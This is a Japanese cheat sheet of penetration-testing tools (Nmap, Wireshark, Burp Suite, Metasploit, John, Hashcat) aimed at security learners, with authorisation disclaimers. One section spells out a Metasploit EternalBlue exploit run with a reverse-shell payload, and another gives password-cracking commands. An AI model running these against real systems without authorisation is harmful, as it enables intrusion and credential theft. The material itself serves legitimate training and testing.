# セキュリティツール チートシート

> ⚠️ **免責事項**: 以下の操作は、自分が管理するシステム・許可を得たシステムに対してのみ実施すること。無許可でのスキャンや攻撃は違法。

---

## 1. Nmap（ネットワークスキャン）

### 基本スキャン

| コマンド | 説明 |
|---|---|
| `nmap <ターゲット>` | 基本スキャン（上位1000ポート） |
| `nmap 192.168.1.0/24` | ネットワーク全体をスキャン |
| `nmap -p 80,443 <ターゲット>` | 指定ポートのみスキャン |
| `nmap -p 1-65535 <ターゲット>` | 全ポートをスキャン |
| `nmap -p- <ターゲット>` | 全ポートスキャン（省略形） |
| `nmap -F <ターゲット>` | 上位100ポートのみ（高速） |

### スキャン方式

| コマンド | 説明 |
|---|---|
| `nmap -sS <ターゲット>` | SYNスキャン（ステルス・要root） |
| `nmap -sT <ターゲット>` | TCPコネクトスキャン（rootなしでも可） |
| `nmap -sU <ターゲット>` | UDPスキャン |
| `nmap -sn <ターゲット>` | ピングスキャン（ポートスキャンなし・疎通確認） |
| `nmap -Pn <ターゲット>` | pingなしでスキャン（pingブロック環境向け） |

### 情報収集オプション

| コマンド | 説明 |
|---|---|
| `nmap -sV <ターゲット>` | サービスのバージョンを検出 |
| `nmap -O <ターゲット>` | OSを検出（要root） |
| `nmap -A <ターゲット>` | 総合スキャン（OS・バージョン・スクリプト・traceroute） |
| `nmap --script=<スクリプト名> <ターゲット>` | NSEスクリプトを実行 |
| `nmap --script=vuln <ターゲット>` | 既知脆弱性をスキャン |
| `nmap --script=http-title <ターゲット>` | WebページのタイトルをHTTPで取得 |

### 速度・出力

| コマンド | 説明 |
|---|---|
| `nmap -T0` ～ `-T5` | スキャン速度（T0:最遅 ～ T5:最速、通常T3or4） |
| `nmap -v <ターゲット>` | 詳細出力 |
| `nmap -oN result.txt <ターゲット>` | 結果をテキストファイルに保存 |
| `nmap -oX result.xml <ターゲット>` | 結果をXMLで保存 |
| `nmap -oA result <ターゲット>` | 全形式で保存 |

### よく使うコマンド例

```bash
# ローカルネットワークの生存確認
nmap -sn 192.168.1.0/24

# 特定ホストの詳細スキャン
nmap -A -T4 192.168.1.1

# Webサーバーのスキャン
nmap -p 80,443,8080,8443 -sV 192.168.1.1

# 全ポート＋バージョン検出
nmap -p- -sV -T4 192.168.1.1
```

---

## 2. Wireshark（パケットキャプチャ）

### 起動・基本操作

| 操作 | 説明 |
|---|---|
| インターフェースを選択 → 青いサメボタン | キャプチャ開始 |
| 赤い四角ボタン | キャプチャ停止 |
| `Ctrl + E` | キャプチャ開始 / 停止 |
| `Ctrl + S` | キャプチャファイルを保存（.pcapng） |
| `Ctrl + O` | 保存済みファイルを開く |

### ディスプレイフィルター（重要）

| フィルター | 説明 |
|---|---|
| `http` | HTTPパケットのみ表示 |
| `https` または `tls` | TLS/HTTPSパケット |
| `dns` | DNSパケット |
| `tcp` | TCPパケット |
| `udp` | UDPパケット |
| `icmp` | ICMPパケット（pingなど） |
| `ip.addr == 192.168.1.1` | 特定IPのパケット |
| `ip.src == 192.168.1.1` | 送信元が特定IP |
| `ip.dst == 192.168.1.1` | 宛先が特定IP |
| `tcp.port == 80` | ポート80のパケット |
| `http.request.method == "POST"` | HTTPのPOSTのみ |
| `http contains "password"` | "password"を含むパケット |
| `frame contains "flag"` | フレーム全体からキーワード検索 |

### フィルターの組み合わせ

```
# ANDで絞り込み
ip.addr == 192.168.1.1 && tcp.port == 80

# ORで広げる
http || dns

# NOTで除外
!arp

# 範囲指定
tcp.port >= 1024 && tcp.port <= 2048
```

### パケット解析の手順

```
1. キャプチャ開始
2. 調べたい通信を実行（ブラウザでアクセスなど）
3. キャプチャ停止
4. フィルターで絞り込む
5. パケットをクリックして詳細を確認
   - Frame（物理層情報）
   - Ethernet（MACアドレス）
   - IP（送受信IPアドレス）
   - TCP/UDP（ポート番号）
   - アプリケーション層（HTTP、DNSなど）
6. 右クリック → Follow → TCP Stream でセッション全体を表示
```

### コマンドライン版（tshark）

```bash
# インターフェース一覧
tshark -D

# キャプチャしてファイルに保存
tshark -i eth0 -w capture.pcap

# フィルターをかけてキャプチャ
tshark -i eth0 -f "port 80"

# pcapファイルを読み込んで解析
tshark -r capture.pcap

# フィールドを指定して出力
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e http.request.uri
```

---

## 3. Burp Suite（Webアプリ診断）

### 初期設定

```
1. Burp Suiteを起動
2. Proxy → Proxy settings → Bind address: 127.0.0.1:8080
3. ブラウザのプロキシ設定を変更
   → HTTP: 127.0.0.1, Port: 8080
4. Burp CA証明書のインストール
   → ブラウザで http://burp にアクセス → CA Certificate をダウンロード
   → ブラウザの証明書設定にインポート
```

### 主要ツール

| タブ | 説明 |
|---|---|
| **Proxy → Intercept** | リクエスト/レスポンスをリアルタイムで傍受・編集 |
| **Proxy → HTTP history** | 通信履歴を一覧表示 |
| **Repeater** | リクエストを手動で何度でも送信（パラメータ改ざんに） |
| **Intruder** | 自動でパラメータを変えながら送信（ブルートフォース等） |
| **Scanner** | 脆弱性を自動スキャン（Pro版のみ） |
| **Decoder** | Base64・URLエンコード/デコード |
| **Comparer** | 2つのリクエスト/レスポンスを比較 |

### 基本操作フロー

```
1. Intercept ON でリクエストを傍受
2. リクエストを確認・編集して Forward で送信
3. 気になるリクエストを右クリック → Send to Repeater
4. Repeaterでパラメータを変えて繰り返しテスト
5. 特定パラメータを調べるなら Send to Intruder
```

### よく使うショートカット

| ショートカット | 説明 |
|---|---|
| `Ctrl + I` | Intercepterに送信 |
| `Ctrl + R` | Repeaterに送信 |
| `Ctrl + Shift + I` | Intruderに送信 |
| `Ctrl + U` | URLエンコード |
| `Ctrl + Shift + U` | URLデコード |

---

## 4. DVWA（Damn Vulnerable Web App）

### Docker経由での起動

```bash
docker run -d -p 80:80 vulnerables/web-dvwa
# ブラウザで http://localhost にアクセス
# admin / password でログイン
# → Setup / Reset DB をクリック
```

### 難易度設定

```
DVWA Security → Low / Medium / High / Impossible
最初は Low で動作を理解 → Medium で回避策を学ぶ
```

### 各脆弱性カテゴリ

| カテゴリ | 学習内容 |
|---|---|
| SQL Injection | SQLインジェクションの原理と対策 |
| XSS (Reflected) | クロスサイトスクリプティング |
| XSS (Stored) | 永続型XSS |
| CSRF | クロスサイトリクエストフォージェリ |
| File Upload | 不正ファイルアップロード |
| Command Injection | OSコマンドインジェクション |
| Brute Force | ブルートフォース攻撃 |
| File Inclusion | ファイルインクルード |

---

## 5. Metasploit（ペネトレーションテストフレームワーク）

> ⚠️ 許可を得た環境（自分のVMや学習用ネットワーク）でのみ使用すること

```bash
# 起動
msfconsole

# 基本コマンド
help                          # ヘルプを表示
search <キーワード>           # モジュールを検索
use <モジュールパス>          # モジュールを選択
info                          # 選択中モジュールの情報
show options                  # 必要なオプションを表示
set <オプション名> <値>       # オプションを設定
run  または  exploit          # 実行
back                          # 前のメニューに戻る
exit                          # 終了

# よく使う例
search ms17-010               # EternalBlueを検索
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.x
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.y
run
```

---

## 6. John the Ripper / Hashcat（パスワードクラック）

> ⚠️ 自分が管理するハッシュ・許可を得た環境でのみ使用すること

### John the Ripper

```bash
# ハッシュをクラック（自動検出）
john hashes.txt

# 辞書攻撃
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# ハッシュの種類を指定
john --format=md5crypt hashes.txt

# クラック済みパスワードを表示
john --show hashes.txt
```

### Hashcat

```bash
# ハッシュタイプ確認（-m オプション）
# MD5 = 0, SHA1 = 100, bcrypt = 3200

# 辞書攻撃
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# ブルートフォース（マスク攻撃）
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l  # 小文字6文字
```

---

## 7. よく使う Kali Linux ツール一覧

| ツール | 用途 |
|---|---|
| `nmap` | ネットワークスキャン |
| `wireshark` / `tshark` | パケットキャプチャ・解析 |
| `burpsuite` | Webアプリ診断 |
| `metasploit` / `msfconsole` | ペネトレーションテスト |
| `hydra` | ブルートフォース（HTTP・FTP・SSH等） |
| `aircrack-ng` | Wi-Fi暗号解析 |
| `gobuster` / `dirb` | Webディレクトリ探索 |
| `nikto` | Webサーバー脆弱性スキャン |
| `sqlmap` | SQL Injection自動化 |
| `john` / `hashcat` | パスワードクラック |
| `binwalk` | バイナリ解析・ファイル抽出 |
| `strings` | バイナリからASCII文字列を抽出 |
| `exiftool` | ファイルのメタデータを表示 |
| `steghide` | ステガノグラフィー（画像に情報埋め込み） |
| `volatility` | メモリフォレンジック |

---

## 8. CTF向けコマンド集

### ファイル解析

```bash
# ファイルの種類を確認
file <ファイル名>

# 文字列を抽出
strings <ファイル名>
strings -n 8 <ファイル名>   # 8文字以上の文字列

# 16進数で表示
xxd <ファイル名>
xxd <ファイル名> | head -20  # 先頭20行

# バイナリ内のファイルを抽出
binwalk -e <ファイル名>

# メタデータを表示
exiftool <ファイル名>
```

### エンコード/デコード

```bash
# Base64エンコード
echo "Hello" | base64

# Base64デコード
echo "SGVsbG8=" | base64 -d

# URLデコード（Python）
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"

# ROT13
echo "Hello" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# 16進数 → 文字列（Python）
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"
```

### ネットワーク確認

```bash
# 開いているポートを確認
ss -tuln
netstat -an

# プロセスとポートの対応
ss -tulnp
lsof -i :8080

# HTTPリクエストを送る
curl -v http://target.com
curl -X POST -d "param=value" http://target.com
curl -H "Authorization: Bearer <token>" http://target.com
```

---

## 9. セキュリティ学習ロードマップ

```
初級
├── TryHackMe（ガイド付き学習）
│   └── Pre-Security → Jr Penetration Tester path
├── DVWA（ローカル環境）
└── OverTheWire: Bandit（Linux + SSH操作）

中級
├── Hack The Box（実践的なマシン）
├── PicoCTF（CTF）
└── VulnHub（脆弱なVMをダウンロードして攻撃）

資格
├── CompTIA Security+
├── eJPT（初級ペネトレーション）
└── OSCP（実践的なペネトレーション認定）
```

---

## 10. セキュリティ関連コマンド（日常的な確認）

```bash
# 自分のIPアドレスを確認
ip a
ifconfig

# ルーティングテーブルを確認
ip route
route -n

# ファイアウォールのルールを確認
sudo iptables -L
sudo ufw status

# 実行中のサービスを確認
systemctl list-units --type=service --state=running

# ログインユーザーを確認
who
w

# 最近のログイン履歴
last

# sudo使用履歴
grep sudo /var/log/auth.log

# ファイルのハッシュ値を計算（改ざん検知）
md5sum <ファイル>
sha256sum <ファイル>

# ファイルを安全に削除（復元できないように）
shred -u <ファイル>
```
